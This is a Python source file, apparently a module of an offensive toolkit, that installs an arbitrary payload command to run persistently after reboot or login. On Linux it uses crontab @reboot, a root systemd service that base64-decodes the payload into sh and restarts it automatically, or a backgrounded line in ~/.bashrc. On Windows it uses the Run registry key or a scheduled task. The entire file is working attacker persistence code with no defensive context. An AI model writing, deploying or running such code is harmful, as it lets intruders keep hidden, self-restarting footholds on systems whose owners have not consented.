"""
@module: persist
@desc: 持久化安装（重启不丢）：
  Linux:   cron(@reboot) / systemd(unit) / bashrc
  Windows: registry(Run 键) / schtasks(计划任务)

payload 为重启后执行的命令。systemd 用 base64 包装避免特殊字符。
"""
import base64
import os
import subprocess

MODULE = {
    "desc": "持久化（cron/systemd/bashrc/registry/schtasks）",
    "params": [("target", "必填；cron/systemd/bashrc/registry/schtasks"),
               ("payload", "必填；重启后执行的命令")],
}


def _cron(payload):
    """crontab @reboot（当前用户）。"""
    try:
        cur = subprocess.check_output(
            ["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
    except Exception:
        cur = ""
    line = f"@reboot {payload}"
    if line in cur:
        return "(cron already installed)"
    new = (cur.rstrip() + "\n" + line + "\n") if cur.strip() else line + "\n"
    try:
        subprocess.run(["crontab", "-"], input=new, text=True, timeout=10)
        return f"(cron installed: {line})"
    except Exception as e:
        return f"(error: {e})"


def _systemd(payload):
    """systemd unit（需 root）。payload 经 base64 包装避免特殊字符。"""
    b64 = base64.b64encode(payload.encode("utf-8")).decode("ascii")
    unit = (
        "[Unit]\nDescription=pyexec persist\nAfter=network.target\n\n"
        "[Service]\nType=simple\n"
        f"ExecStart=/bin/sh -c \"echo {b64} | base64 -d | sh\"\n"
        "Restart=always\n\n"
        "[Install]\nWantedBy=multi-user.target\n"
    )
    path = "/etc/systemd/system/pyexec-persist.service"
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(unit)
        subprocess.run(["systemctl", "enable", "pyexec-persist"],
                       timeout=10, capture_output=True)
        subprocess.run(["systemctl", "start", "pyexec-persist"],
                       timeout=10, capture_output=True)
        return f"(systemd unit installed: {path})"
    except Exception as e:
        return f"(error: {e})"


def _bashrc(payload):
    """追加到 ~/.bashrc（后台执行）。"""
    rc = os.path.join(os.path.expanduser("~"), ".bashrc")
    line = f"({payload}) &"
    try:
        with open(rc, "r", encoding="utf-8", errors="replace") as f:
            cur = f.read()
    except OSError:
        return f"(error reading {rc})"
    if line in cur:
        return "(bashrc already installed)"
    try:
        with open(rc, "a", encoding="utf-8") as f:
            f.write("\n" + line + "\n")
        return f"(bashrc installed: {rc})"
    except OSError as e:
        return f"(error: {e})"


def _registry(payload):
    """HKCU Run 键（登录自启）。"""
    key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        subprocess.run(["reg", "add", key, "/v", "pyexec",
                        "/d", payload, "/f"], timeout=10,
                       capture_output=True)
        return "(registry Run key installed: pyexec)"
    except Exception as e:
        return f"(error: {e})"


def _schtasks(payload):
    """计划任务（登录时运行）。"""
    try:
        subprocess.run(["schtasks", "/create", "/tn", "pyexec",
                        "/tr", payload, "/sc", "onlogon", "/f"],
                       timeout=10, capture_output=True)
        return "(schtasks installed: pyexec)"
    except Exception as e:
        return f"(error: {e})"


def run(target, payload):
    """安装持久化。target 见 MODULE desc。"""
    if os.name == "nt":
        if target == "registry":
            return _registry(payload)
        if target == "schtasks":
            return _schtasks(payload)
        return f"(unsupported target on windows: {target})"
    if target == "cron":
        return _cron(payload)
    if target == "systemd":
        return _systemd(payload)
    if target == "bashrc":
        return _bashrc(payload)
    return f"(unsupported target: {target})"


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("usage: persist <target> <payload>")
        sys.exit(1)
    print(run(sys.argv[1], sys.argv[2]))
